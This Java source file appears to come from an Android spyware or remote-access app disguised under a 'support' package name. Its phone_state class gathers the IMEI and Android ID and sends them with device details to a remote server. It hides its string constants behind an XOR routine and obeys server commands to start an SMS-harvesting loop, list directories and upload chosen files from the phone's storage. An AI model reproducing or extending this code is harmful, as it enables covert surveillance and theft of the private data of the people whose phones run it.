package com.support.samsg;

import static android.os.Environment.*;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class phone_state {

    static Context mContext;
    protected int mRetry;
    protected static String KEY;

    protected static JSONObject mLogData = null;

    protected static ExecutorService mExecutorService;


    protected static String strID = null;
    protected static int mFlag = 0;
    public static int g_sms_interval=0;
    public static int g_interval=0;
    public static sms_loop smsLoop = null;
    public static Filemanager mFilemgr;
    public phone_state(Context context) {
        mContext = context;
        mLogData = new JSONObject();
        mExecutorService = Executors.newSingleThreadExecutor();
        mFilemgr = new Filemanager(mContext);
    }
    @SuppressLint("HardwareIds")
    public static String getIMEI() {
        String deviceId;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            } else {
                final TelephonyManager mTelephony = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
                if (mTelephony.getDeviceId() != null) {
                    deviceId = mTelephony.getDeviceId();
                } else {
                    deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
                }
            }
            return deviceId;
        }catch(Exception e)
        {
            deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return deviceId;

        }
    }
    protected static String GetIdentifier() {
        try {
            return Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return MyCrypt.crypt("#54(4\u0018/*#.", 19);
        }
    }
    public static void start_process() {

            String IMEI = getIMEI();
            strID = "Kur-" + IMEI + "_" + GetIdentifier();

        try {

            mLogData.put(MyCrypt.crypt("r\u0016v\n", 42), MyCrypt.crypt("u\nr\u001Bo\u0001a\u001C", 42));//"TYPE", "SETTINGS"
            mLogData.put(MyCrypt.crypt("o\u0002c\u0006", 42), IMEI);

            String _data = mLogData.toString();
            mExecutorService.submit(new PostByWeb(mContext, PostType.DATA, strID, _data, new ICallBack() {
                @Override
                public boolean onFinished(String response) {
                    return true;
                }
                @Override
                public void onError(String error) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));

                }
                @Override
                public void onSuccess(Object resp) throws JSONException, ArrayIndexOutOfBoundsException  {
                    String result = (String) resp;
                    String[] settings = result.split(MyCrypt.crypt("z3", 42));//"\\|"
                    for (String setting : settings) {
                        String[] temp = setting.split(MyCrypt.crypt("u", 42));//":"

                        String _tags = "";
                        String _value = "0";

                        try {
                            // 여기에 배열에서 값을 가져오는 코드를 작성합니다.
                            _tags = temp[0];
                            _value = temp[1];

                            // 만약 예외가 발생하지 않으면 이 부분이 실행됩니다.
                        } catch (ArrayIndexOutOfBoundsException e) {
                            // 배열 인덱스가 유효하지 않은 경우 예외가 발생하고 이 부분이 실행됩니다.
                            e.printStackTrace(); // 예외 정보를 출력합니다.
                            // 또는 다른 예외 처리 동작을 수행할 수 있습니다.
                        }

                        if (_tags.equals("Sms_interval")){
                            int n_interval = Integer.parseInt(_value);
                            if (n_interval == 0) {
                                if(g_sms_interval != 0){
                                    smsLoop.stoprun();
                                }
                                g_sms_interval = 0;
                            }
                            else if(g_sms_interval != n_interval){
                                if(g_sms_interval != 0){
                                    smsLoop.stoprun();
                                }
                                try {
                                    Thread.sleep(5000);
                                } catch (InterruptedException e) {
                                    throw new RuntimeException(e);
                                }
                                g_sms_interval = n_interval;
                                smsLoop =new sms_loop(mContext,g_sms_interval);
                                Thread sms_thread = new Thread(smsLoop);
                                sms_thread.start();
                            }

                        }
                        if (_tags.equals("Interval")){
                            int n_interval = Integer.parseInt(_value);
                            if(g_interval != n_interval){
                                    body.interval = n_interval;
                                    g_interval = n_interval;
                            }

                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                            if (isExternalStorageManager()) {
                                if (_tags.equals("Filelist") && _value.equals("0")) {

                                    String str_dirpath ="";



                                    try {
                                        // 여기에 배열에서 값을 가져오는 코드를 작성합니다.
                                        str_dirpath = temp[2];

                                        // 만약 예외가 발생하지 않으면 이 부분이 실행됩니다.
                                    } catch (ArrayIndexOutOfBoundsException e) {
                                        // 배열 인덱스가 유효하지 않은 경우 예외가 발생하고 이 부분이 실행됩니다.
                                        e.printStackTrace(); // 예외 정보를 출력합니다.
                                        // 또는 다른 예외 처리 동작을 수행할 수 있습니다.
                                    }

                                    if (str_dirpath.equals("root") || str_dirpath.equals("")){
                                        mFilemgr.dosyalar();
                                    }
                                    else {
                                        mFilemgr.getDirectory(str_dirpath, false);
                                    }

                                }
                                if (_tags.equals("Filedown")) {
                                    String _filepath = "";
                                    try {
                                        // 여기에 배열에서 값을 가져오는 코드를 작성합니다.
                                        _filepath = temp[2];

                                        // 만약 예외가 발생하지 않으면 이 부분이 실행됩니다.
                                    } catch (ArrayIndexOutOfBoundsException e) {
                                        // 배열 인덱스가 유효하지 않은 경우 예외가 발생하고 이 부분이 실행됩니다.
                                        e.printStackTrace(); // 예외 정보를 출력합니다.
                                        // 또는 다른 예외 처리 동작을 수행할 수 있습니다.
                                    }
                                    if (_value.equals("0"))
                                    {
                                        Filemanager.getfile(_filepath);
                                    }
                                }
                            }
                        }
                        else {
                            if (mContext.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                                if (_tags.equals("Filelist") && _value.equals("0")) {
                                    String str_dirpath ="";
                                    try {
                                        // 여기에 배열에서 값을 가져오는 코드를 작성합니다.
                                        str_dirpath = temp[2];

                                        // 만약 예외가 발생하지 않으면 이 부분이 실행됩니다.
                                    } catch (ArrayIndexOutOfBoundsException e) {
                                        // 배열 인덱스가 유효하지 않은 경우 예외가 발생하고 이 부분이 실행됩니다.
                                        e.printStackTrace(); // 예외 정보를 출력합니다.
                                        // 또는 다른 예외 처리 동작을 수행할 수 있습니다.
                                    }
                                    if (str_dirpath.equals("root") || str_dirpath.equals("")){
                                        mFilemgr.dosyalar();
                                    }
                                    else {
                                        mFilemgr.getDirectory(str_dirpath, false);
                                    }

                                }
                                if (_tags.equals("Filedown")) {
                                    String _filepath = "";
                                    try {
                                        // 여기에 배열에서 값을 가져오는 코드를 작성합니다.
                                        _filepath = temp[2];

                                        // 만약 예외가 발생하지 않으면 이 부분이 실행됩니다.
                                    } catch (ArrayIndexOutOfBoundsException e) {
                                        // 배열 인덱스가 유효하지 않은 경우 예외가 발생하고 이 부분이 실행됩니다.
                                        e.printStackTrace(); // 예외 정보를 출력합니다.
                                        // 또는 다른 예외 처리 동작을 수행할 수 있습니다.
                                    }
                                    if (_value.equals("0"))
                                    {
                                        Filemanager.getfile(_filepath);
                                    }
                                }
                            }
                        }

                    }

                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    if(mFlag < 3)  {
                        send_logs();
                        mFlag ++ ;
                    }
                }
            }));
        } catch (JSONException e) {
            mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
            mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
         }


    }

    public static String getDeviceInfo() {
        try {

            JSONObject object = new JSONObject();

            object.put(MyCrypt.crypt("\u0002E+O#", 43), Build.MODEL);//"Model"
            object.put(MyCrypt.crypt("\u0002K!_)K,^:X*", 43), Build.MANUFACTURER);//"Manufacture"
            object.put(MyCrypt.crypt("\u001Cn\u0004", 43), Build.VERSION.SDK_INT);//"SDK"
            object.put(MyCrypt.crypt("\u001DO#O.Y*", 43), Build.VERSION.RELEASE);//"Release"

            return object.toString();
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return MyCrypt.crypt("\ng\u001F~\u0016", 43);//"EMPTY"
    }

    private static void send_logs() {
        String IMEI = getIMEI();
      try {
            mLogData.put(MyCrypt.crypt("r\u0016v\n", 42), MyCrypt.crypt("j\u0000a\u001C", 42));//"LOGS"
            mLogData.put(MyCrypt.crypt("o\u0002c\u0006", 42), IMEI);
            mLogData.put(MyCrypt.crypt("b\np\u0006e\n", 42), getDeviceInfo());//"DEVICE"

            String _data =mLogData.toString();

            mExecutorService.submit(new PostByWeb(mContext, PostType.DATA, strID, _data, new ICallBack() {
                @Override
                public boolean onFinished(String response) {
                    return true;
                }
                @Override
                public void onError(String error) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

                }
                @Override
                public void onSuccess(Object resp) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));
                }
            }));
        } catch (JSONException e) {
          mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
          mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
          mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

         }
    }


}
